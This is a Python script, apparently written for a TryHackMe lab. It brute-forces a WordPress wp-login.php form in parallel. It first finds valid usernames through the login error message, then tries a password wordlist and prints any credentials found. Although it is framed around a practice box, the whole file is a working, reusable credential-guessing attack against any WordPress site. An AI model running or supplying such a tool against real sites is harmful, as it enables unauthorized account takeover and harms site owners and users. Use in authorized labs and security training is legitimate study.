#!/usr/bin/env python3

"""WordPress Attack

Try to bruteforce a wordpress login form using multiprocessing
From testing, on average it performs 3x faster with the same user and pwd list
Example WordPress CMS login: 
    - Go to https://tryhackme.com/room/mrrobot
    - Start box and go to http://IP/wp-login.php
    - Run python script on above SITE

Usage: $ python3 wordpress.py [-h] -s SITE -u USERNAMES -p PASSWORDS
Ex: $ python3 mp_wordpress.py -s http://10.10.59.46/wp-login.php -u resources/usernames.txt -p resources/passwords.txt

NOTES FOR IMPROVEMENT:
- Find out how to stop pool executor on successful run with password
- Try using mp.Pool() to conduct tasks
- Modularize mp function
"""

import argparse
import concurrent.futures
import multiprocessing as mp
import sys
import time

import bs4
import requests

target = None
username = None


def argparser():
    """Parses required arguments

    Returns:
        argparse object: Variables to hold host URL, username list, and password list
    """
    parser = argparse.ArgumentParser(description="Wordpress Login Form Hack")
    parser.add_argument(
        "-s", "--site", help="full URL for wordpress login form page", required=True
    )
    parser.add_argument(
        "-u",
        "--usernames",
        type=argparse.FileType("r"),
        help="list of usernames",
        required=True,
    )
    parser.add_argument(
        "-p",
        "--passwords",
        type=argparse.FileType("r"),
        help="list of passwords",
        required=True,
    )
    args = parser.parse_args()
    return args


def check_status(target: str) -> int:
    """Checks status of a web page

    Args:
        target (str): URL for web form

    Returns:
        int: Status code
    """
    try:
        r = requests.get(target)
        print(f"\nStatus for <{target}>: {r.status_code}")
        return r.status_code
    except Exception as e:
        print(f"Exception: {e}")
        return None


def username_task(user: str) -> str:
    """Username task for multiprocessing

    Args:
        user (str): Username for task

    Returns:
        str: A valid username else None
    """
    attempt = requests.post(target, data={"log": user, "pwd": "-1"})
    if "incorrect" in attempt.text:
        return user
    return None


def password_task(pwd: str) -> str:
    """Password task for multiprocessing

    Args:
        pwd (str): Password for task

    Returns:
        str: A valid password else None
    """
    attempt = requests.post(target, data={"log": username, "pwd": pwd})
    if "incorrect" not in attempt.text:
        return pwd
    return None


def wp_mp_login(uf: argparse.FileType, pf: argparse.FileType) -> tuple:
    """Attempts to bruteforce a WordPress login with multiprocessing

    Args:
        uf (FileType): File pointer for list of usernames
        pf (FileType): File pointer for list of passwords

    Returns:
        list: password on success else none
    """
    print(f"Hacking {target}")
    print(f"\t<username list> {uf.name}\n\t<password list> {pf.name}")

    print(f"Cores on machine: {mp.cpu_count()}")

    if check_status(target) != 200:
        print("Page does not exist, stopping...")
        return None

    print("Starting multiprocessing brute force...")

    global username
    password = None

    start = time.perf_counter()

    usernames = [line.strip() for line in uf.readlines()]
    with concurrent.futures.ProcessPoolExecutor() as executor:
        users = executor.map(username_task, usernames)
    users = list(filter(lambda x: x is not None, users))

    if len(users):
        print("Found the following username list:")
        for user in users:
            print(f"\t- {user}")
        username = users[0]
        print(f"Searching for password for user <{username}>...")
        passwords = [line.strip() for line in pf.readlines()]
        with concurrent.futures.ProcessPoolExecutor() as executor:
            pwds = executor.map(password_task, passwords)
        pwds = list(filter(lambda x: x is not None, pwds))
        if len(pwds):
            password = pwds[0]
            print(
                f"\t[+] CREDENTIALS FOUND\n\tUsername: {username}\n\tPassword: {password}"
            )
        else:
            print(f"\t[-] Found no password for <{username}>")
    else:
        print(f"[-] Found no usernames.")

    finish = time.perf_counter()
    print(f"Finished in {finish-start} seconds.")

    return (username, password)


if __name__ == "__main__":
    args = argparser()
    target = args.site
    wp_mp_login(args.usernames, args.passwords)
